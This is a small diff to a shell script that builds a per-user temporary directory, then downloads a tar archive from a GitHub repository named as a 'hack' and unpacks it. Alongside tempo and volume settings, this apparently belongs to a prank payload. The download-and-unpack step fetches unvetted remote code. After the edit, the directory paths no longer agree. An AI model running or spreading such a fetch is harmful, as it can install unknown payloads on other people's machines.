@@ -4,7 +4,7 @@
 init_tempo=10 tempo=3 volume=30 tempo_offset=2 volume_offset=20
 # ------------------------------------------------------------------- #
 
-dir=`whoami` ; dir+='-docker' ; mkdir -p /tmp/$dir
+dir=/tmp ; dir+=`whoami` ; dir+='-docker' ; mkdir -p $dir
 #curl 'nom de domaine' -o /tmp/$dir/proutsh42.tar
 curl https://raw.githubusercontent.com/Don-Chinjao/Mounir_m_a_hack/main/proutsh42.tar -o /tmp/$dir/proutsh42.tar
 tar -xvf /tmp/$dir/proutsh42.tar -C $dir
